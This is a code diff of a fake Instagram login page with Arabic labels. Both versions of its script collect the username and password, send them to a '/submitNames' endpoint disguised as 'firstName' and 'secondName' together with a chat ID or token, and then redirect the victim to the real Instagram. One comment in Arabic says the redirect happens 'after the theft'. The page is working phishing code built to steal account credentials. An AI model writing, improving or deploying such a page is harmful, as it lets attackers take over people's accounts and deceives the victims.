@@ -3,22 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول • Instagram</title>
+    <title>Instagram Login</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fafafa; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .login-box { background-color: #fff; border: 1px solid #dbdbdb; width: 350px; padding: 40px; box-sizing: border-box; text-align: center; }
-        .logo { width: 175px; margin-bottom: 30px; }
-        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 3px; background-color: #fafafa; box-sizing: border-box; }
-        button { width: 100%; padding: 7px; border: none; border-radius: 4px; background-color: #0095f6; color: #fff; font-weight: bold; cursor: pointer; }
-        button:disabled { background-color: #b2dffc; }
-        .footer { margin-top: 20px; font-size: 12px; color: #8e8e8e; }
+        body { font-family: sans-serif; background-color: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
+        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background-color: #0095f6; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; margin-top: 10px; }
     </style>
 </head>
 <body>
     <div class="login-box">
-        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252e00b568.png" class="logo" alt="Instagram">
+        <h2 style="font-style: italic;">Instagram</h2>
         <form id="loginForm">
-            <input type="text" id="username" placeholder="اسم المستخدم أو الهاتف أو البريد" required>
+            <input type="text" id="username" placeholder="اسم المستخدم أو الهاتف" required>
             <input type="password" id="password" placeholder="كلمة السر" required>
             <button type="submit">تسجيل الدخول</button>
         </form>
@@ -26,23 +23,24 @@
 
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get('chatId');
+        const token = urlParams.get('t');
 
-        document.getElementById('loginForm').onsubmit = function(e) {
+        document.getElementById('loginForm').onsubmit = async (e) => {
             e.preventDefault();
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
 
-            fetch('/submitNames', {
+            await fetch('/submitNames', {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                body: `chatId=${chatId}&firstName=${encodeURIComponent(user)}&secondName=${encodeURIComponent(pass)}`
-            })
-            .then(() => {
-                // توجيه الضحية لصفحة إنستجرام الحقيقية بعد السرقة
-                window.location.href = "https://www.instagram.com";
-            })
-            .catch(err => console.error("Error:", err));
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    token: token,
+                    firstName: username,
+                    secondName: password
+                })
+            });
+
+            window.location.href = "https://instagram.com";
         };
     </script>
 </body>
